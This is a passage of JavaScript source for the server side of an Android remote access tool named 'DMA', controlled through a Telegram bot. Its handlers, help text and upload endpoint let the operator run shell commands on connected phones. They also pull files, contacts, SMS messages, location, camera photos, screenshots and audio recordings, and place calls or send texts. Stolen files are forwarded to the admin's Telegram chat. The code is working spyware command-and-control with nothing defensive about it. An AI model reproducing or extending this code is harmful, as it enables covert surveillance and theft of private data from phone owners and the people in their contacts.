        bot.sendMessage(chatId, `🎤 Recording ${seconds} seconds on ${deviceId.substring(0, 8)}...`);
    } else {
        bot.sendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
    }
});

bot.onText(/\/shell (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== adminId) return;
    
    const deviceId = match[1];
    const command = match[2];
    
    const device = connectedDevices.get(deviceId);
    if (device) {
        sendCommandToDevice(deviceId, 'execute', { cmd: command });
        bot.sendMessage(chatId, `⚡ Executing command on ${deviceId.substring(0, 8)}...\n\`${command}\``, { parse_mode: 'Markdown' });
    } else {
        bot.sendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
    }
});

bot.onText(/\/files (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== adminId) return;
    
    const deviceId = match[1];
    const device = connectedDevices.get(deviceId);
    
    if (device) {
        setUserSession(chatId, { 
            state: 'awaiting_file_path', 
            deviceId: deviceId
        });
        bot.sendMessage(chatId, `📁 Enter file path to browse on ${deviceId.substring(0, 8)}:\nExample: /storage/emulated/0/Downloads`, removeKeyboard);
    } else {
        bot.sendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
    }
});

bot.onText(/\/contacts (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== adminId) return;
    
    const deviceId = match[1];
    const device = connectedDevices.get(deviceId);
    
    if (device) {
        sendCommandToDevice(deviceId, 'get_contacts');
        bot.sendMessage(chatId, `📒 Getting contacts from ${deviceId.substring(0, 8)}...`);
    } else {
        bot.sendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
    }
});

bot.onText(/\/messages (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== adminId) return;
    
    const deviceId = match[1];
    const device = connectedDevices.get(deviceId);
    
    if (device) {
        sendCommandToDevice(deviceId, 'get_messages');
        bot.sendMessage(chatId, `📨 Getting messages from ${deviceId.substring(0, 8)}...`);
    } else {
        bot.sendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
    }
});

bot.onText(/\/settings/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== adminId) return;
    
    bot.sendMessage(chatId, '⚙️ Device Settings:', settingsKeyboard);
});

bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== adminId) return;
    
    showHelp(chatId);
});

function showHelp(chatId) {
    const helpText = `
🤖 *DMA - Help Guide*

*Interactive Controls:*
• Use the keyboard buttons for quick actions
• Select devices from the list
• Follow prompts for inputs

*Available Features:*
• 📸 Screenshot - Take device screenshot
• 📍 Location - Get device GPS location
• 📷 Camera - Take photo with front/rear camera
• 🎤 Record - Record audio (10s-5min)
• 📁 Files - Browse device filesystem
• 📞 Call - Make phone call
• 💬 SMS - Send text message
• 📱 Apps - List installed applications
• ⚡ Command - Execute shell commands
• 📊 Info - Get detailed device information

*Text Commands:*
/list - Show connected devices
/info <device_id> - Get device info
/cmd <device_id> <command> - Execute command
/file <device_id> <path> - Get file
/screen <device_id> - Take screenshot
/call <device_id> <number> - Make call
/sms <device_id> <number> <message> - Send SMS
/apps <device_id> - List installed apps
/location <device_id> - Get location
/camera <device_id> <front|back> - Take photo
/record <device_id> <seconds> - Record audio
/shell <device_id> <command> - Run shell command
/files <device_id> - Browse files
/contacts <device_id> - Get contacts
/messages <device_id> - Get messages
/settings - Device settings
/keyboard - Show interactive keyboard

*Note:* Replace <device_id> with the device ID shown in /list
    `;
    
    bot.sendMessage(chatId, helpText, { parse_mode: 'Markdown' });
}

// HTTP endpoints
app.post('/api/upload', upload.single('file'), (req, res) => {
    try {
        const deviceId = req.headers['device-id'];
        const fileType = req.headers['file-type'] || 'unknown';
        
        if (!deviceId) {
            return res.status(400).json({ error: 'Device ID required' });
        }
        
        if (!req.file) {
            return res.status(400).json({ error: 'No file uploaded' });
        }
        
        const fileUrl = `${process.env.SERVER_URL || 'http://localhost:8999'}/${req.file.path}`;
        
        // Send file to Telegram
        const caption = `📁 File from ${deviceId}\nType: ${fileType}\nSize: ${(req.file.size / 1024 / 1024).toFixed(2)}MB`;
        
        bot.sendDocument(adminId, req.file.path, { caption })
            .then(() => {
                // Clean up after sending
                setTimeout(() => {
                    if (fs.existsSync(req.file.path)) {
                        fs.unlinkSync(req.file.path);
                    }
                }, 60000);
            });
        
        res.json({ success: true, url: fileUrl });
        
    } catch (error) {
        console.error('Upload error:', error);
        res.status(500).json({ error: 'Upload failed' });
    }
});

app.post('/api/getfile', (req, res) => {
    const { deviceId, filePath } = req.body;
    
    if (!deviceId || !filePath) {
        return res.status(400).json({ error: 'Missing parameters' });
    }
    
    const device = connectedDevices.get(deviceId);
    if (!device) {
        return res.status(404).json({ error: 'Device not connected' });
    }
    
    const cmdObj = {
        type: 'command',
        id: uuidv4(),
        command: 'get_file',
        data: { path: filePath },
        timestamp: Date.now()
    };
    
    device.ws.send(JSON.stringify(cmdObj));
    res.json({ success: true, message: 'File request sent' });
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        connectedDevices: connectedDevices.size,
        uptime: process.uptime(),
        timestamp: new Date().toISOString()
    });
});

// Cleanup old sessions
setInterval(() => {
    const now = Date.now();
    userSessions.forEach((session, userId) => {
        if (now - session.timestamp > 15 * 60 * 1000) { // 15 minutes
            userSessions.delete(userId);
        }
    });
}, 5 * 60 * 1000); // Every 5 minutes

// Cleanup old files periodically
setInterval(() => {
    const now = Date.now();
    const maxAge = 24 * 60 * 60 * 1000; // 24 hours
    
    ['uploads', 'screenshots'].forEach(dir => {
        if (fs.existsSync(dir)) {
            fs.readdirSync(dir).forEach(file => {
                const filePath = path.join(dir, file);
                try {
                    const stats = fs.statSync(filePath);
                    if (now - stats.mtimeMs > maxAge) {
                        fs.unlinkSync(filePath);
                    }
                } catch (error) {
                    console.error('Cleanup error:', error);
                }
            });
        }
    });
}, 60 * 60 * 1000); // Every hour

// Start server
const PORT = process.env.PORT || 8999;
server.listen(PORT, () => {
    console.log(`🚀 DMA Server running on port ${PORT}`);
    console.log(`🤖 Bot: @Device1deep_bot`);
    console.log(`🌐 Server: ${process.env.SERVER_URL || 'http://localhost:' + PORT}`);
    logEvent('SERVER_STARTED', 'system', `Port: ${PORT}`);
    
    // Setup bot commands on start
    setupBotCommands().catch(console.error);
});

// Handle graceful shutdown
process.on('SIGTERM', () => {
    console.log('SIGTERM received. Shutting down gracefully...');
    wss.close(() => {
        server.close(() => {
            process.exit(0);
        });
    });
});
